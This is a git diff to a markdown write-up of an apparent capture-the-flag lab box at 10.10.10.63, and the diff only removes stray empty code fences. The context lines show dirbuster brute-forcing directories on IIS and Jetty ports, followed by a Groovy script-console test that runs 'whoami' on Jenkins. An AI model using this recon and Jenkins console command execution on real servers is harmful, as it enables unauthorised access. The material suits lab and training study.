@@ -32,16 +32,12 @@ Going to run dirbuster on them
 
 ### Running Dirbuster on IIS 10.0
 ```
-
-```
 dirbuster -u http://10.10.10.63 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
 Starting dir/file list based brute forcing
 ```
 
 ### Running Dirbuster on JETTY 9.4
-```
-
 ```
 dirbuster -u http://10.10.10.63:50000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
 Starting OWASP DirBuster 1.0-RC1
@@ -68,8 +64,6 @@ println(Jenkins.instance.pluginManager.plugins)
 All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.
 
 ### Groovy Script Test
-```
-
 ```
 cmd = "whoami"
 println cmd.execute().text
